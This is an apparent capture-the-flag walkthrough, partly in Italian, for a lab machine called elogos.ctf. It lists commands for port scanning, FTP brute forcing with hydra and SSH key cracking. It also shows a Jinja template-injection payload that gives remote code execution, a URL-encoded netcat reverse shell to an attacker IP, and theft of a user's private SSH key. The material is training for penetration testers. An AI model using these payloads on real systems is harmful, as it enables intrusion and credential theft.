### **PORT SCANNING**
```bash
nmap -sT -T5 --min-rate=10000 -p- 192.168.86.129
```
![[Pasted image 20231011153211.png]]

### **PATH 1 - FTP**
Go to http://elogos.ctf/about-us and take note of the listed username (email)
![[Pasted image 20231011153524.png]]

After that launch a brute force with hydra on ftp to gain access
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
```

ls -la and take the private ssh key. Crack it.
```
ssh2john id_rsa > hash
```
![[Pasted image 20231011153933.png]]![[Pasted image 20231011154601.png]]

Log in as j.brock via ssh
### **PATH 2 - WEB**
*Cookie Bypass*
http://elogos.ctf/login
Use inspect to retrieve the cookie and decode it.
![[Pasted image 20231011154838.png]]
Change logged in to true and save it in the browser
*HardCoded Credentials*

*Web to www-Data*
![[Pasted image 20231011154905.png]]
Use the "user=" parameter to inject the ssti payload and achieve a RCE
```python
{{request.application.__globals__.__builtins__.__import__('os').popen("id").read()}}
```
Usa la reverse shell url encodata
```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.86.130%204444%20%3E%2Ftmp%2Ff
```
![[Pasted image 20231011155050.png]]
Now use the rce to obtain a reverse shell
![[Pasted image 20231012163853.png]]
*www-Data to John*
intera home j.brock leggibile da gruppo web-developer di cui www-Data fa parte
![[Pasted image 20231012164214.png]]
catta id_rsa
``` bash
cat /home/j.brock/.ssh/id_rsa
```
e craccalo